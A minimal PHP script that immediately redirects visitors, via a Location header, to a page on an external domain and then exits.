<?php
  header('Location: https://kkctalenthub.com/uhqxrc/SG/cm/');
  exit();
?>